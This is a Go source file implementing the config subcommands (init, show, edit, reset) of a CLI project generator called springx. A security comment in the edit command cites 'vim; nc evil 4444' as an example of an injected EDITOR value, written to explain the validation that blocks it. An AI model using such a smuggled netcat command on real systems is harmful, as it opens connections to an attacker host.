package cmd

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"

	"github.com/spf13/cobra"

	"github.com/saireddy-shyamakura/springx/internal/config"
	"github.com/saireddy-shyamakura/springx/internal/validate"
)

var configCmd = &cobra.Command{
	Use:   "config",
	Short: "Manage springx default configuration",
	Long: `Manage persistent default values for springx project generation.

springx reads configuration from:
  Linux / macOS : ~/.config/springx/config.yaml
  Windows       : %APPDATA%\springx\config.yaml

Environment variables take precedence over the config file:

  SPRINGX_GROUP_ID        Default Group ID          (e.g. com.mycompany)
  SPRINGX_ARTIFACT_PREFIX Prefix for Artifact IDs   (e.g. service-)
  SPRINGX_PACKAGE_PREFIX  Prefix for Package names  (e.g. com.mycompany)
  SPRINGX_JAVA_VERSION    Default Java version      (e.g. 21)
  SPRINGX_BUILD_TOOL      Default build tool ID     (e.g. maven-project)
  SPRINGX_PACKAGING       Default packaging         (e.g. jar)
  SPRINGX_LANGUAGE        Default language          (e.g. java)`,
	Example: `  springx config init
  springx config show
  springx config edit
  springx config reset`,
}

var configInitCmd = &cobra.Command{
	Use:   "init",
	Short: "Create a default configuration file",
	Long: `Write a default configuration file if one does not already exist.

The generated file contains sensible defaults (Java 21, Maven, jar) which
you can edit with 'springx config edit'.`,
	Example: `  springx config init`,
	RunE: func(cmd *cobra.Command, args []string) error {
		path, err := config.GetConfigPath()
		if err != nil {
			return err
		}

		if _, err := os.Stat(path); err == nil {
			fmt.Printf("Config file already exists at: %s\n", path)
			fmt.Println("Run 'springx config show' to view it or 'springx config edit' to modify it.")
			return nil
		}

		def := config.DefaultConfig()
		if err := config.Save(&def); err != nil {
			return fmt.Errorf("failed to create config: %w", err)
		}

		fmt.Printf("✔  Created config file at: %s\n", path)
		fmt.Println("   Run 'springx config edit' to customize your defaults.")
		return nil
	},
}

var configShowCmd = &cobra.Command{
	Use:   "show",
	Short: "Display the active configuration",
	Long: `Print the current effective configuration, including any values loaded
from the config file and environment variable overrides.`,
	Example: `  springx config show`,
	RunE: func(cmd *cobra.Command, args []string) error {
		path, _ := config.GetConfigPath()
		cfg, err := config.Load()
		if err != nil {
			return err
		}

		fmt.Printf("  Config file    : %s\n", path)
		fmt.Println("  ─────────────────────────────────────")
		fmt.Printf("  Group ID       : %s\n", cfg.GroupID)
		fmt.Printf("  Artifact Prefix: %s\n", cfg.ArtifactPrefix)
		fmt.Printf("  Package Prefix : %s\n", cfg.PackagePrefix)
		fmt.Printf("  Java Version   : %s\n", cfg.JavaVersion)
		fmt.Printf("  Build Tool     : %s\n", cfg.BuildTool)
		fmt.Printf("  Packaging      : %s\n", cfg.Packaging)
		fmt.Printf("  Language       : %s\n", cfg.Language)
		fmt.Println("  ─────────────────────────────────────")
		return nil
	},
}

var configEditCmd = &cobra.Command{
	Use:   "edit",
	Short: "Open the configuration file in your $EDITOR",
	Long: `Open the springx configuration file in your default editor.

The editor is determined by the $EDITOR environment variable. If $EDITOR
is not set, 'nano' is used on Linux/macOS and 'notepad' on Windows.

If the configuration file does not exist yet, it is created with defaults
before the editor is opened.`,
	Example: `  springx config edit
  EDITOR=vim springx config edit`,
	RunE: func(cmd *cobra.Command, args []string) error {
		path, err := config.GetConfigPath()
		if err != nil {
			return err
		}

		if _, err := os.Stat(path); os.IsNotExist(err) {
			def := config.DefaultConfig()
			if err := config.Save(&def); err != nil {
				return fmt.Errorf("failed to create config before editing: %w", err)
			}
		}

		editor := os.Getenv("EDITOR")
		if editor == "" {
			editor = os.Getenv("VISUAL")
		}
		if editor == "" {
			if runtime.GOOS == "windows" {
				editor = "notepad"
			} else {
				editor = "nano"
			}
		}

		// Security: the editor string is user-controlled (from the
		// environment) and is passed to the OS. Reject anything that is
		// not a bare command name — no spaces, no shell metacharacters —
		// so a value like "vim; nc evil 4444" cannot execute arbitrary
		// commands. Argument-style editors (e.g. "code --wait") are not
		// supported for the same reason; set EDITOR to a wrapper script.
		if !validate.ShellSafe.MatchString(editor) {
			return fmt.Errorf("refusing to run editor %q: $EDITOR/$VISUAL must be a single command name without spaces or shell metacharacters", editor)
		}

		c := exec.Command(editor, path)
		c.Stdin = os.Stdin
		c.Stdout = os.Stdout
		c.Stderr = os.Stderr
		return c.Run()
	},
}

var configResetCmd = &cobra.Command{
	Use:   "reset",
	Short: "Delete the configuration file",
	Long: `Delete the springx configuration file, reverting all settings to defaults.

This only removes the file on disk. Environment variable overrides remain
active for the current shell session.`,
	Example: `  springx config reset`,
	RunE: func(cmd *cobra.Command, args []string) error {
		path, err := config.GetConfigPath()
		if err != nil {
			return err
		}

		if err := config.Reset(); err != nil {
			return err
		}

		fmt.Printf("✔  Deleted config file: %s\n", path)
		fmt.Println("   springx will use built-in defaults until you run 'springx config init'.")
		return nil
	},
}

func init() {
	configCmd.AddCommand(configInitCmd)
	configCmd.AddCommand(configShowCmd)
	configCmd.AddCommand(configEditCmd)
	configCmd.AddCommand(configResetCmd)
	rootCmd.AddCommand(configCmd)
}
